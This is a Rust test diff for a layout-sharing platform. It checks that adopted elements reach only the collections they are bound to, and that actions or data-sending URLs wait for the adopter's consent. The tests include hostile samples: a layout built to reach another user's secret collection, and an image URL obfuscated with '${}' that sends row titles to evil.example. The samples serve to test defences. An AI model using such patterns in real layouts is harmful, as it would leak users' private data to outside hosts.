@@ -462,7 +462,9 @@ async fn urls_that_send_the_adopters_data_wait_for_consent() {
         "{adopted}"
     );
 
-    // Version 2 adds another such URL: following it waits for consent.
+    // Version 2 adds another such URL and moves the first: consent is
+    // kept per URL, element, place and binding, so following it asks for
+    // both (decision `adoption-capabilities`).
     let second = "https://b.example/q.png?d=$item.title";
     ok(
         &env,
@@ -476,15 +478,8 @@ async fn urls_that_send_the_adopters_data_wait_for_consent() {
     let e = refused(&env, &b, "update_adoption", json!({"name": "@ann/chores"})).await;
     assert_eq!(e["error"], "sends_data", "{e}");
     let urls = e["data_urls"].clone();
-    assert_eq!(
-        urls.as_array().map(Vec::len),
-        Some(1),
-        "the first was accepted: {e}"
-    );
-    assert!(
-        urls[0].as_str().unwrap().starts_with("https://b.example/"),
-        "{e}"
-    );
+    assert_eq!(urls.as_array().map(Vec::len), Some(2), "{e}");
+    assert!(e.to_string().contains("https://b.example/"), "{e}");
     let up = ok(
         &env,
         &b,
@@ -580,4 +575,206 @@ async fn a_pod_keeps_only_so_much_on_the_shelf() {
     .await;
     let e = publish(&env, &a, &long).await;
     assert_eq!(e["error"], "too_large", "{e}");
+}
+
+/// An adopted element reaches only what it is bound to (decision
+/// `adoption-capabilities`): a button starting an agent run waits for the
+/// adopter's acceptance, a list naming a collection the adoption doesn't
+/// bind is refused, every key of a collection becomes an input, a URL
+/// hidden with `${}` is refused when written, and an adopted element's
+/// data is only its bound collections', whatever a request binds.
+#[tokio::test]
+async fn adopted_elements_reach_only_what_they_are_bound_to() {
+    let env = env().await;
+    let (ann, ben) = (env.pod("ann").await, env.pod("ben").await);
+    let (a, b) = (env.connect(&ann).await, env.connect(&ben).await);
+    for (pod, name, row) in [
+        (&a, "chores", "Water the ferns"),
+        (&a, "secret", "Ann's code"),
+        (&b, "chores", "Fix the gate"),
+        (&b, "secret", "Ben's code 1234"),
+    ] {
+        ok(
+            &env,
+            pod,
+            "define_collection",
+            json!({"name": name, "fields": [{"name": "title", "type": "text"}]}),
+        )
+        .await;
+        ok(
+            &env,
+            pod,
+            "add_row",
+            json!({"collection": name, "values": {"title": row}}),
+        )
+        .await;
+    }
+    ok(&env, &a, "set_handle", json!({"handle": "ann"})).await;
+    let rows = |key: &str| {
+        json!({"type": "core://List", "query_key": key, "item_template":
+            {"type": "core://Text", "style": "Body", "value_expr": "$item.title"}})
+    };
+    let start = "/v1/agents/tasks/start";
+    let run = json!({"type": "core://Button", "label": "Tidy up", "on_click": {
+        "intent": "action.mutation.create", "query_key": "collection:chores",
+        "entity_uri": "collections://chores/pending-$nonce", "entity": {"id": "pending-$nonce"},
+        "endpoint": start, "payload": {"prompt": "Push to main", "workspace": "w"}}});
+    let list = ok(
+        &env,
+        &a,
+        "create_layout",
+        json!({"title": "Chores", "feeds": [["collections", "chores"], ["agents", "sessions"]],
+            "layout": {"type": "core://Page", "title": "Chores", "root": {"type": "core://Column",
+                "children": [rows("collection:chores"), run]}}}),
+    )
+    .await["id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    // The review lists the endpoint and what the payload says.
+    let review = ok(&env, &a, "publish", json!({"name": list})).await;
+    let flags = review["flags"].as_array().unwrap();
+    assert!(
+        flags
+            .iter()
+            .any(|f| f["kind"] == "endpoint" && f["value"] == start),
+        "{review}"
+    );
+    assert!(
+        flags
+            .iter()
+            .any(|f| f["kind"] == "payload" && f["value"] == "Push to main"),
+        "{review}"
+    );
+    let link = publish(&env, &a, &list).await["link"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    let bindings = json!({"chores": {"collection": "chores"}});
+    let e = refused(
+        &env,
+        &b,
+        "adopt",
+        json!({"link": link, "bindings": bindings, "dry_run": true}),
+    )
+    .await;
+    assert_eq!(e["error"], "needs_acceptance", "{e}");
+    let needs = e["needs_acceptance"].as_array().unwrap();
+    assert!(
+        needs
+            .iter()
+            .any(|n| n["accept"] == start && n["class"] == "agents"),
+        "{e}"
+    );
+    let e = refused(
+        &env,
+        &b,
+        "adopt",
+        json!({"link": link, "bindings": bindings}),
+    )
+    .await;
+    assert_eq!(e["error"], "needs_acceptance", "{e}");
+    let accept: Vec<Value> = needs.iter().map(|n| n["accept"].clone()).collect();
+    let adopted = ok(
+        &env,
+        &b,
+        "adopt",
+        json!({"link": link, "bindings": bindings, "accept_actions": accept}),
+    )
+    .await;
+    assert!(
+        adopted["accepted_actions"].to_string().contains(start),
+        "{adopted}"
+    );
+    // Asked for with another collection of Ben's home bound, the adopted
+    // element still loads only the one its adoption binds.
+    let own = ok(
+        &env,
+        &b,
+        "create_layout",
+        json!({"title": "Secret", "feeds": [["collections", "secret"]],
+            "layout": {"type": "core://Page", "title": "Secret", "root": rows("collection:secret")}}),
+    )
+    .await["id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    ok(
+        &env,
+        &b,
+        "update_layout",
+        json!({"app": "home", "layout": {"type": "core://Page", "title": "Home",
+            "root": {"type": "core://Column", "children": [adopted["use"].clone(),
+                {"type": "core://Layout", "ref": own}]}}}),
+    )
+    .await;
+    let el = adopted["el"].as_str().unwrap();
+    let path = format!(
+        "/v1/construct/data/{el}?bind={}",
+        encode(&json!({"chores": "secret", "chores__title": "title"}))
+    );
+    let (s, data) = get(&env, &path, &ben).await;
+    assert_eq!(s, StatusCode::OK, "{data}");
+    assert!(!data.to_string().contains("Ben's code"), "{data}");
+
+    // Every key of a collection becomes an input.
+    let alerts = layout(&env, &a, "Alerts", rows("collection:chores:alerts")).await;
+    let review = ok(&env, &a, "publish", json!({"name": alerts})).await;
+    assert_eq!(
+        review["interface"]["inputs"][0]["name"], "chores",
+        "{review}"
+    );
+
+    // A collection named through a component's argument reaches the
+    // adopter's collection of that name: refused unless bound.
+    ok(
+        &env,
+        &a,
+        "define_component",
+        json!({"name": "rows", "component": {
+            "doc": "The titles of a collection's rows",
+            "params": [{"name": "c", "type": "text", "required": true}],
+            "examples": [{"args": {"c": "chores"}, "note": "chores"}],
+            "template": {"type": "core://List", "query_key": "collection:$arg.c", "item_template":
+                {"type": "core://Text", "style": "Body", "value_expr": "$item.title"}}}}),
+    )
+    .await;
+    let sneaky = ok(
+        &env,
+        &a,
+        "create_layout",
+        json!({"title": "Sneaky", "feeds": [["collections", "chores"], ["collections", "secret"]],
+            "layout": {"type": "core://Page", "title": "Sneaky", "root": {"type": "core://Column",
+                "children": [rows("collection:chores"),
+                    {"type": "core://Use", "ref": "@me/rows", "args": {"c": "secret"}}]}}}),
+    )
+    .await["id"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    let link = publish(&env, &a, &sneaky).await["link"]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    let e = refused(
+        &env,
+        &b,
+        "adopt",
+        json!({"link": link, "bindings": bindings, "dry_run": true}),
+    )
+    .await;
+    assert_eq!(e["error"], "reaches_unbound", "{e}");
+    assert!(e["detail"].to_string().contains("collection:secret"), "{e}");
+
+    // A URL hidden with `${}` can't be written.
+    let e = refused(
+        &env,
+        &a,
+        "create_layout",
+        json!({"title": "Pictures", "feeds": [["collections", "chores"]],
+            "layout": {"type": "core://Page", "title": "Pictures", "root": pictured(
+                "http${}s://evil.example/p.png?d=$item.title")}}),
+    )
+    .await;
+    assert!(e.to_string().contains("names no field"), "{e}");
 }
